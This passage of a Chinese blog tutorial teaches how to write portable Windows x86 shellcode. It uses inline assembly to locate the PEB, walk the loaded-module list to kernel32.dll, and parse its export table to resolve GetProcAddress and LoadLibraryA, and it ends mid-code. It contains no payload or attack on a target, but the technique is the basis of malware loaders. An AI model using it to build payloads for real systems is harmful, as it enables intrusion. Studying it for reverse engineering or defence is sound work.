*PLDR_DATA_TABLE_ENTRY;</span><br></pre></td></tr></table></figure><p>InMemoryOrderModuleList字段是一个指针，指向LDR_DATA_TABLE_ENTRY 结构体上的LIST_ENTRY字段，但是它不是指向LDR_DATA_TABLE_ENTRY 起始位置的指针，而是指向这个结构的InMemoryOrderLinks字段。</p><h1 id="3-编写shellcode"><a href="#3-编写shellcode" class="headerlink" title="3.编写shellcode"></a>3.编写shellcode</h1><h2 id="3-1-c-库文件配合内联汇编"><a href="#3-1-c-库文件配合内联汇编" class="headerlink" title="3.1 c++库文件配合内联汇编"></a>3.1 c++库文件配合内联汇编</h2><p>先来针对指定系统的shellcode的编写，指定系统的,我们首先通过LoadLibraryA函数导入相应的dll文件，获得一个dll句柄，在把这个dll句柄当作参数传入GetProcAddress 搜索查找指定函数，返回该函数的地址，然后通过函数的地址来调用函数，用c++代码内联汇编实现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;Windows.h&gt;</span><br><span class="line">#include&lt;iostream&gt;</span><br><span class="line">#include&lt;string.h&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">  string cmd &#x3D; &quot;dir&quot;;</span><br><span class="line">  HINSTANCE Libhandle &#x3D; LoadLibraryA(&quot;msvcrt.dll&quot;); &#x2F;&#x2F;加载dll文件</span><br><span class="line">  if (Libhandle &#x3D;&#x3D; NULL)</span><br><span class="line">  &#123;</span><br><span class="line">    return 0;</span><br><span class="line">  &#125;</span><br><span class="line">  &#x2F;&#x2F;system(&quot;dir&quot;);</span><br><span class="line">  cout &lt;&lt;&quot;msvcrt Address &#x3D; &quot;&lt;&lt; Libhandle &lt;&lt; endl;</span><br><span class="line">  LPTSTR getaddr &#x3D; (LPTSTR)GetProcAddress(Libhandle, &quot;system&quot;);&#x2F;&#x2F;获得system函数的地址</span><br><span class="line">  cout &lt;&lt; &quot;system Address &#x3D; &quot; &lt;&lt; getaddr &lt;&lt; endl;</span><br><span class="line">  &#x2F;&#x2F;通过汇编代码来调用函数</span><br><span class="line">    _asm&#123;</span><br><span class="line">            &#x2F;&#x2F;system(&quot;dir&quot;); &#x2F;&#x2F;64 69 72</span><br><span class="line">            pushad</span><br><span class="line">            pushfd</span><br><span class="line">            xor ebx, ebx</span><br><span class="line"></span><br><span class="line">            mov ebx,0x726964  ;这里需要注意数据入栈的顺序</span><br><span class="line">            push ebx</span><br><span class="line"></span><br><span class="line">            push esp</span><br><span class="line"></span><br><span class="line">            mov ebx, getaddr</span><br><span class="line">            call ebx</span><br><span class="line"></span><br><span class="line">            add esp,8</span><br><span class="line"></span><br><span class="line">            popfd</span><br><span class="line">            popad</span><br><span class="line">    &#125;</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>会得到这个效果</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3148187291.jpg"></p><p>但是这是c++代码去加载相应头文件，直接调用LoadLibraryA来加载，具有局限性，无法移植的shellcode，且那段内联汇编代码必须在导入相应链接库得情况才能执行，不然会报错。</p><p>这里补充一点知识：</p><blockquote><p>其实程序最开始加载并不是从main函数的，main函数也是别的函数调用执行的。</p><p>1.首先操作系统必须的创建进程，然后jmp到这个进程的入口函数</p><p>2.然后经过一系列的初始化</p><p>3.完成初始化之后，调用main函数，开始执行程序主体。</p></blockquote><p>所以说，我们这里我们直接用BinaryNinja打开，找到可执行文件的入口点并不是main函数入口点</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4120466773.jpg"></p><p>他会先从初始化函数开始（这里是编译器给我加的）,一直执行到我们mian函数</p><h2 id="3-2-从PEB表查找LoadLibraryA，GetProcAddress"><a href="#3-2-从PEB表查找LoadLibraryA，GetProcAddress" class="headerlink" title="3.2 从PEB表查找LoadLibraryA，GetProcAddress"></a>3.2 从PEB表查找LoadLibraryA，GetProcAddress</h2><p>在上面讲了，虽然我们通过c++库拿到了LoadLibraryA和GetProcAddress函数，但是在实际的情况下并不实用，因为实际情况下并没有c++库给我们调用，所以这时候就体现了PEB表的优势在，因为PEB表是位于所有进程内存中固定位置的结构体，所以我们在任意进程里都能找到PEB表，通过PEB表找到kernel32.dll，从Kernel32.dll中找到LoadLibraryA，和GetProcAddress这个两个函数，这样就解决了可移植性的问题。</p><p>这里首先还得了解一个非常重要的概念，FS段寄存器，在我们介绍Kernel32.dll时候，说了工作在ringo，属于内核级文件，与之相对应的User32.dll 工作在ring3，属于用户级文件，这里就涉及了内核态和用户态，不讲深了，你只需要知道我们的程序虽然在用户层里运行，但是有时候也需要切换到内核状态。</p><p>而FS寄存器的改变，就意味着程序在R3和R0之间进行切换（都是在R0下给FS赋不同值的），在R3下：FS段寄存器的值是0x3B,在R0下：FS段寄存器的值是0x30，注意这里0x30和0x3B 是代表指向GDT表中的不同段。</p><blockquote><p>当运行在R3下时,FS指向的段是GDT中的0x3B段.该段的长度为4K,基地址为当前线程的线程环境块（TEB），所以该段也被称为“TEB段”<br>当运行在R0下时, FS指向的段是GDT中的0x30段.该段的长度也为4K,基地址为0xFFDFF000.该地址指向系统的处理器控制区域（KPCR）</p></blockquote><p><strong>从以上可得知，我们如何去找PEB的基地址？</strong></p><p>在R3状态下的FS寄存器存的值就是PEB表基地址，加上偏移量0X30，就得到了PEB的地址，上汇编代码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov eax,fs:[ecx + 0x30];PEB</span><br></pre></td></tr></table></figure><p>找到了PEB表，然后通过PEB加上偏移0xC得到PPEB_LDR_DATA [Ldr]结构体的地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov eax, [eax + 0xc] ;PEB-&gt;Ldr</span><br></pre></td></tr></table></figure><p>再偏移0x14，找到InMemoryOrderLinks</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov esi,[eax+0x14];PEB-&gt;Ldr-&gt;InMemoryOrderModuleList</span><br></pre></td></tr></table></figure><p>现在我们的寄存器放的值就是InMemoryOrderModuleList地址哟，但是我们想要的kernel32.dll处于第三个模块（固定位置，第三），我们前面讲了在LIST_ENTRY结构体中，可以通过Flink和Blink指针进行模块的切换，而InMemoryOrderModuleList便是LIST_ENTRY结构体指针，而InMemoryOrderModuleList指向的就是LIST_ENTRY结构体中的InMemoryOrderLinks（Flink指针）字段，我们通过InMemoryOrderLinks（Flink指针）字段来遍历到Kernel32.dll模块。</p><blockquote><p>lodsd指令：会把esi寄存器指向的地址读取双字，然后把结果存放在eax寄存器<br>xchg指令：交换寄存器中的值</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">lodsd; 读取第二个模块的地址</span><br><span class="line">xchg eax,esi</span><br><span class="line">lodsd;读取第三模块的地址</span><br><span class="line">mov ebx,[eax+0x10];获得kernel32.dllbase地址</span><br><span class="line">push ebx</span><br></pre></td></tr></table></figure><p>因为InMemoryOrderLinks在LIST_ENTRY偏移为0x8,而dllbase为0x18，所以InMemoryOrderLinks到dllbase只需要偏移0x10,这里我们就找到了kernel32.dll base地址。</p><p><strong>如何通过kernel32.dll地址找到 GetProcAddress函数地址？</strong></p><p>这里需要解析kernel32.DLL文件的PE头找到导出表(前面就说了，dll文件也是PE文件格式)，需要找到PE头，在PE文件结构中，是用IMAGE_DOS_HEADER结构体来定义DOS文件头</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _IMAGE_DOS_HEADER &#123;      &#x2F;&#x2F; DOS .EXE header</span><br><span class="line">    WORD   e_magic;             &#x2F;&#x2F; 00000000  4D 5A，Magic number</span><br><span class="line">    WORD   e_cblp;             &#x2F;&#x2F; 00000002  90 00，Bytes on last page of file</span><br><span class="line">    WORD   e_cp;               &#x2F;&#x2F; 00000004  03 00，Pages in file</span><br><span class="line">    WORD   e_crlc;            &#x2F;&#x2F; 00000006  00 00，Relocations</span><br><span class="line">    WORD   e_cparhdr;           &#x2F;&#x2F; 00000008  04 00，Size of header in paragraphs</span><br><span class="line">    WORD   e_minalloc;        &#x2F;&#x2F; 0000000A  00 00，Minimum extra paragraphs needed</span><br><span class="line">    WORD   e_maxalloc;          &#x2F;&#x2F; 0000000C  FF FF，Maximum extra paragraphs needed</span><br><span class="line">    WORD   e_ss;                &#x2F;&#x2F; 0000000E  00 00，Initial (relative) SS value</span><br><span class="line">    WORD   e_sp;             &#x2F;&#x2F; 00000010  B8 00，Initial SP value</span><br><span class="line">    WORD   e_csum;          &#x2F;&#x2F; 00000012  00 00，Checksum</span><br><span class="line">    WORD   e_ip;                &#x2F;&#x2F; 00000014  00 00，Initial IP value</span><br><span class="line">    WORD   e_cs;                &#x2F;&#x2F; 00000016  00 00，Initial (relative) CS value</span><br><span class="line">    WORD   e_lfarlc;        &#x2F;&#x2F; 00000018  40 00，File address of relocation table</span><br><span class="line">    WORD   e_ovno;           &#x2F;&#x2F; 0000001A  00 00，Overlay number</span><br><span class="line">WORD   e_res[4];            &#x2F;&#x2F; 0000001C  00 00 00 00，Reserved words</span><br><span class="line">        &#x2F;&#x2F; 00000020  00 00 00 00</span><br><span class="line">    WORD   e_oemid;             &#x2F;&#x2F; 00000024  00 00，OEM identifier (for e_oeminfo)</span><br><span class="line">    WORD   e_oeminfo;           &#x2F;&#x2F; 00000026  00 00，OEM information; e_oemid specific</span><br><span class="line">WORD   e_res2[10];          &#x2F;&#x2F; 00000028  00 00 00 00，Reserved words</span><br><span class="line">        &#x2F;&#x2F; 0000002C  00 00 00 00</span><br><span class="line">        &#x2F;&#x2F; 00000030  00 00 00 00</span><br><span class="line">        &#x2F;&#x2F; 00000034  00 00 00 00</span><br><span class="line">        &#x2F;&#x2F; 00000038  00 00 00 00</span><br><span class="line">    LONG    e_lfanew;           &#x2F;&#x2F; 0000003C  F8 00 00 00，File address of new exe header</span><br><span class="line">&#125; IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;</span><br></pre></td></tr></table></figure><p>其中有用的两个字段，分别是e_magic和e_lfanew，一个是dos 签名：标志这是dos头，一个记载PE头的在文件中偏移，我们要拿到e_lfanew值，通过它来找到NT文件头，这里偏移量为0x3c</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov edx,[ebx+0x3c];e_lfanew</span><br><span class="line">add edx,ebx;加上基地址，得到了PEheader地址</span><br></pre></td></tr></table></figure><p>来看看NT文件头</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _IMAGE_NT_HEADERS64 &#123;</span><br><span class="line">    DWORD Signature;&#x2F;&#x2F;Signature PE文件标识，被定义为00004550</span><br><span class="line">    IMAGE_FILE_HEADER FileHeader;&#x2F;&#x2F;FileHeader,该结构指向IMAGE_FILE_HEADER。</span><br><span class="line">    IMAGE_OPTIONAL_HEADER64 OptionalHeader;</span><br><span class="line">&#125; IMAGE_NT_HEADERS64, *PIMAGE_NT_HEADERS64;</span><br><span class="line">typedef struct _IMAGE_NT_HEADERS &#123;</span><br><span class="line">    DWORD Signature;</span><br><span class="line">    IMAGE_FILE_HEADER FileHeader;</span><br><span class="line">    IMAGE_OPTIONAL_HEADER32 OptionalHeader;&#x2F;&#x2F;OptionalHeader,该结构指向_IMAGE_OPTIONAL_HEADER32,Windows操作系统可执行文件的大部分特性均在这个结构里面呈现</span><br><span class="line">&#125; IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;</span><br><span class="line">#ifdef _WIN64</span><br><span class="line">typedef IMAGE_NT_HEADERS64                  IMAGE_NT_HEADERS;</span><br><span class="line">typedef PIMAGE_NT_HEADERS64                PIMAGE_NT_HEADERS;</span><br><span class="line">#else</span><br><span class="line">typedef IMAGE_NT_HEADERS32                  IMAGE_NT_HEADERS;</span><br><span class="line">typedef PIMAGE_NT_HEADERS32                PIMAGE_NT_HEADERS;</span><br><span class="line">#endif</span><br></pre></td></tr></table></figure><p>这里有两种，一种是32位的，一种是64位的，因为我这里是拿的c++中里面的库里面的结构体定义，直接复制粘贴过来了，结构上大体一样，这里OptionalHeader 指向着选项头</p><p>来看看选项头：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _IMAGE_OPTIONAL_HEADER &#123;</span><br><span class="line">     WORD    Magic;                   &#x2F;&#x2F; 标志字, ROM 映像（0107h）,普通可执行文件（010Bh）</span><br><span class="line">&#x2F;*Magic字段 ：说明文件的类型，如果为010Bh，表面文件为PE32；如果为0107h,表明文件为ROM映像；如果为20Bh,表面文件为PE64.*&#x2F;</span><br><span class="line">     BYTE    MajorLinkerVersion;      &#x2F;&#x2F; 链接程序的主版本号</span><br><span class="line">     BYTE    MinorLinkerVersion;      &#x2F;&#x2F; 链接程序的次版本号</span><br><span class="line">     DWORD   SizeOfCode;              &#x2F;&#x2F; 所有含代码的节的总大小</span><br><span class="line">     DWORD   SizeOfInitializedData;   &#x2F;&#x2F; 所有含已初始化数据的节的总大小</span><br><span class="line">     DWORD   SizeOfUninitializedData; &#x2F;&#x2F; 所有含未初始化数据的节的大小</span><br><span class="line">     DWORD   AddressOfEntryPoint;     &#x2F;&#x2F; 程序执行入口RVA</span><br><span class="line">     DWORD   BaseOfCode;              &#x2F;&#x2F; 代码的区块的起始RVA</span><br><span class="line">     DWORD   BaseOfData;              &#x2F;&#x2F; 数据的区块的起始RVA  </span><br><span class="line">     DWORD   ImageBase;               &#x2F;&#x2F; 程序的首选装载地址</span><br><span class="line">&#x2F;*ImageBase字段 指出文件的优先装入地址。也就是说当文件被执行时，如果可能的话，Windows优先将文件装入到由ImageBase字段指定的地址中。只有指定的地址已经被**模块</span><br><span class="line">使用时，文件才被装入到**地址中。链接器产生可执行文件的时候对应这个地址来生成机器码，所以当文件被装入这个地址时不需要进行重定位操作，装入的速度最快。如果文件</span><br><span class="line">被装载到**地址的话，将不得不进行重定位操作，这样就要慢一点。对于EXE文件来说，由于每个文件总是使用独立的虚拟地址空间，优先装入地址不可能被**模块占据，所以EXE</span><br><span class="line">总是能够按照这个地址装入。这也意味着EXE文件不再需要重定位信息。对于DLL文件来说，由于多个DLL文件全部使用宿主EXE文件的地址空间，不能保证优先装入地址没有被**的</span><br><span class="line">DLL使用，所以DLL文件中必须包含重定位信息以防万一。因此，在前面介绍的 IMAGE_FILE_HEADER 结构的 Characteristics 字段中，DLL 文件对应的 IMAGE_FILE_RELOCS_STRIPPED </span><br><span class="line">位总是为0，而EXE文件的这个标志位总是为1。在链接的时候，可以通过对link.exe指定&#x2F;base:address选项来自定义优先装入地址，如果不指定这个选项的话，一般EXE文件的默认</span><br><span class="line">优先装入地址被定为00400000h，而DLL文件的默认优先装入地址被定为10000000h。*&#x2F; </span><br><span class="line">     DWORD   SectionAlignment;        &#x2F;&#x2F; 内存中的区块的对齐大小</span><br><span class="line">     DWORD   FileAlignment;    &#x2F;&#x2F; 文件中的区块的对齐大小</span><br><span class="line">    WORD    MajorOperatingSystemVersion;  &#x2F;&#x2F; 要求操作系统最低版本号的主版本号</span><br><span class="line">    WORD    MinorOperatingSystemVersion;  &#x2F;&#x2F; 要求操作系统最低版本号的副版本号</span><br><span class="line"></span><br><span class="line">    WORD    MajorImageVersion;       &#x2F;&#x2F; 本PE文件映像的主版本号</span><br><span class="line">    WORD    MinorImageVersion;       &#x2F;&#x2F; 本PE文件映像的次版本号</span><br><span class="line">    WORD    MajorSubsystemVersion;   &#x2F;&#x2F; 运行所需要的子系统的主版本号</span><br><span class="line">    WORD    MinorSubsystemVersion;   &#x2F;&#x2F; 运行所需要的子系统的次版本号</span><br><span class="line">    DWORD   Win32VersionValue;       &#x2F;&#x2F; 子系统版本号，暂时保留未用。必须设置为0</span><br><span class="line">    DWORD   SizeOfImage;             &#x2F;&#x2F; 映像装入内存后的总尺寸    +54h </span><br><span class="line">    DWORD   SizeOfHeaders;           &#x2F;&#x2F; 所有头 + 区块表的尺寸大小</span><br><span class="line"></span><br><span class="line">    DWORD   CheckSum;                &#x2F;&#x2F; 映像的校检和       +5Ch    </span><br><span class="line">    WORD    Subsystem;               &#x2F;&#x2F; 可执行文件期望的子系统  表3-4</span><br><span class="line">    WORD    DllCharacteristics;      &#x2F;&#x2F; Dll文件属性 +60h     表3-6  </span><br><span class="line"></span><br><span class="line">         DWORD   SizeOfStackReserve;      &#x2F;&#x2F; 初始化时保留的栈大小</span><br><span class="line">    DWORD   SizeOfStackCommit;       &#x2F;&#x2F; 初始化时实际提交的栈大小    +68h  </span><br><span class="line"></span><br><span class="line">         DWORD   SizeOfHeapReserve;       &#x2F;&#x2F; 初始化时保留的堆大小</span><br><span class="line">    DWORD   SizeOfHeapCommit;        &#x2F;&#x2F; 初始化时实际提交的堆大小    +70h    </span><br><span class="line">&#x2F;*SizeOfHeapCommit字段：初始化时提交的堆大小，在进程初始化时设定的堆所占用的内存空间。默认值为1页。*&#x2F;</span><br><span class="line">         DWORD   LoaderFlags;             &#x2F;&#x2F; 加载标志   与调试有关，默认为 0 </span><br><span class="line">    DWORD   NumberOfRvaAndSizes;     &#x2F;&#x2F; 下边数据目录的项数，这个字段自Windows NT 发布以来一直是16</span><br><span class="line">    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];   &#x2F;&#x2F; 数据目录表</span><br><span class="line">&#x2F;*DataDirectory字段 这个字段可以说是最重要的字段之一，它由16个相同的IMAGE_DATA_DIRECTORY结构组成。虽然PE文件中的数据是按照装入内存后的页属性归类而被放在不同</span><br><span class="line">的节中的，但是这些处于各个节中的数据按照用途可以被分为导出表、导入表、资源、重定位表等数据块，这16个IMAGE_DATA_DIRECTORY结构就是用来定义多种不同用途的</span><br><span class="line">数据块的。*&#x2F;</span><br><span class="line">&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;</span><br></pre></td></tr></table></figure><p>这里的DataDirectory字段是我们需要注意的，因为在这个字段中有导出表的数据块，算算该字段的偏移，0x78</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov edx, [edx + 0x78]</span><br><span class="line">add edx, ebx;export table addr</span><br></pre></td></tr></table></figure><p>我们来看看数据目录，IMAGE_DATA_DIRECTORY结构体：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _IMAGE_DATA_DIRECTORY &#123;</span><br><span class="line">  DWORD VirtualAddress;&#x2F;&#x2F;RVA</span><br><span class="line">  DWORD Size;</span><br><span class="line">&#125; IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;</span><br></pre></td></tr></table></figure><p>定义非常简单，但它仅仅指出了某种数据块的位置和长度，看一下索引所代表的含义：</p><table><thead><tr><th>索 引</th><th>索引值在Windows.inc中的预定义值</th><th>对应的数据块</th></tr></thead><tbody><tr><td>0</td><td>IMAGE_DIRECTORY_ENTRY_EXPORT</td><td>导出表</td></tr><tr><td>1</td><td>IMAGE_DIRECTORY_ENTRY_IMPORT</td><td>导入表</td></tr><tr><td>2</td><td>IMAGE_DIRECTORY_ENTRY_RESOURCE</td><td>资源</td></tr><tr><td>3</td><td>IMAGE_DIRECTORY_ENTRY_EXCEPTION</td><td>异常（具体资料不详）</td></tr><tr><td>4</td><td>IMAGE_DIRECTORY_ENTRY_SECURITY</td><td>安全（具体资料不详）</td></tr><tr><td>5</td><td>IMAGE_DIRECTORY_ENTRY_BASERELOC</td><td>重定位表</td></tr><tr><td>6</td><td>IMAGE_DIRECTORY_ENTRY_DEBUG</td><td>调试信息</td></tr><tr><td>7</td><td>IMAGE_DIRECTORY_ENTRY_ARCHITECTURE</td><td>版权信息</td></tr><tr><td>8</td><td>IMAGE_DIRECTORY_ENTRY_GLOBALPTR</td><td>具体资料不详</td></tr><tr><td>9</td><td>IMAGE_DIRECTORY_ENTRY_TLS</td><td>Thread Local Storage</td></tr><tr><td>10</td><td>IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG</td><td>具体资料不详</td></tr><tr><td>11</td><td>IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT</td><td>具体资料不详</td></tr><tr><td>12</td><td>IMAGE_DIRECTORY_ENTRY_IAT</td><td>导入函数地址表</td></tr><tr><td>13</td><td>IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT</td><td>具体资料不详</td></tr><tr><td>14</td><td>IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR</td><td>具体资料不详</td></tr><tr><td>15</td><td>未使用</td><td></td></tr></tbody></table><p>可以看到，我们要的导出表，就在第一个索引，我们必须得获得获得导出表的地址，但是前面的数据目录是记录着导出表的虚拟地址，而实际的结构如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _IMAGE_EXPORT_DIRECTORY &#123;</span><br><span class="line">    DWORD   Characteristics;   </span><br><span class="line">    DWORD   TimeDateStamp; &#x2F;&#x2F;时间戳.  编译的时间. 把秒转为时间.可以知道这个DLL是什么时候编译出来的.</span><br><span class="line">    WORD    MajorVersion;</span><br><span class="line">    WORD    MinorVersion;</span><br><span class="line">    DWORD   Name;　　　　　　　　　　　&#x2F;&#x2F;指向该导出表文件名的字符串,也就是这个DLL的名称</span><br><span class="line">    DWORD   Base; 　　　　　　　　　　&#x2F;&#x2F; 导出函数的起始序号</span><br><span class="line">    DWORD   NumberOfFunctions;     &#x2F;&#x2F;所有的导出函数的个数</span><br><span class="line">    DWORD   NumberOfNames;         &#x2F;&#x2F;以名字导出的函数的个数</span><br><span class="line">    DWORD   AddressOfFunctions;     &#x2F;&#x2F; 导出的函数地址的地址表  RVA  也就是 函数地址表  </span><br><span class="line">    DWORD   AddressOfNames;         &#x2F;&#x2F; 导出的函数名称表的  RVA      也就是 函数名称表</span><br><span class="line">    DWORD   AddressOfNameOrdinals;  &#x2F;&#x2F; 导出函数序号表的RVA         也就是 函数序号表</span><br><span class="line">&#125; IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;</span><br></pre></td></tr></table></figure><p>但是通过加偏移0x24，当然这是相对于DataDirectory这个基地址来说的，这里我们需要通过AddressOfNames这个指针数组来遍历kernel32.dll加载载的函数名称，来找到GetProcAddress等函数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">mov esi, [edx + 0x20] ; AddressOfNames 偏移 </span><br><span class="line">add esi, ebx; Names table addr</span><br><span class="line">xor ecx,ecx;ecx清零</span><br><span class="line"></span><br><span class="line">Get_Function_ProcAddress:</span><br><span class="line">inc ecx;这里来计数，我们需要知道GetProcAddress的索引</span><br><span class="line">lodsd</span><br><span class="line">add eax,ebx</span><br><span class="line">cmp dword ptr[eax],0x50746547;比较前四个字节GetP字符串的ascill</span><br><span class="line">jnz Get_Function_ProcAddress;没有找到就继续执行</span><br><span class="line">cmp dword ptr[eax + 0x4], 0x41636f72 ; 比较中间四个字节rocA字符串的ascill</span><br><span class="line">jnz Get_Function_ProcAddress</span><br><span class="line">cmp dword ptr[eax + 0x8], 0x65726464 ; 比较中间四个字节ddre字符串的ascill</span><br><span class="line">jnz Get_Function_ProcAddress;这里差不多就稳了</span><br></pre></td></tr></table></figure><p>此时，我们只是找到GetProcAddress函数的索引，必须找到索引相对应的序号，但是注意序号都是从0开始的，这个后面会注意到，会自减1。</p><p>此时，我们只是通过索引来找到GetProcAddress函数的序号，然后我们可以利用序号来找到函数的实际地址：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mov esi, [edx + 0x24]; AddressOfNameOrdinals字段的偏移</span><br><span class="line">add esi, ebx; AddressOfNameOrdinals虚拟地址</span><br><span class="line">mov cx, [esi + ecx * 2]  ; 名称序号数组以2字节大小为单位的数字</span><br><span class="line">dec ecx;自减，因为实际是以0开始的</span><br><span class="line">mov esi, [edx + 0x1c]    ; AddressOfFunctions 字段偏移</span><br><span class="line">add esi, ebx             ;AddressOfFunctions地址</span><br><span class="line">mov edx, [esi + ecx * 4] ;取出GetProcAddress RVA偏移</span><br><span class="line">add edx, ebx             ;  GetProcAddress地址</span><br></pre></td></tr></table></figure><p>总结一下在导出表查找函数的顺序：</p><blockquote><p>通过导出表AddressOfNames找到函数名称对应的索引 =》在AddressOfNameOrdinals表中找到索引对应的序号》通过序号在AddressOfFunctions找到对应的RVA偏移》加上基地址dll文件基地址和函数的RVA地址就得到了函数的RVA</p></blockquote><p><strong>如何获取LoadLibraryA函数地址？</strong></p><p>因为我们已经获得了GetProcAddress地址，我们可以利用GetProcAddress(kernel32, “LoadLibraryA”)这样的方式来查找LoadLibraryA函数的地址，但是在着之前，我们需要保存我们刚找到的地址,在栈上保存数据是最明智的选择。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">push edx;GetProcAddress of addr</span><br><span class="line">;然后进行函数调用</span><br><span class="line">push 0x0</span><br><span class="line">push 0x41797261 ; aryA</span><br><span class="line">push 0x7262694c ; Libr</span><br><span class="line">push 0x64616f4c ; Load 入栈函数参数</span><br><span class="line">push esp        ; &quot;LoadLibrary&quot;</span><br><span class="line">push ebx        ;kernel32.dll of addr</span><br><span class="line">call edx;函数调用GetProcAddress(kernel32, 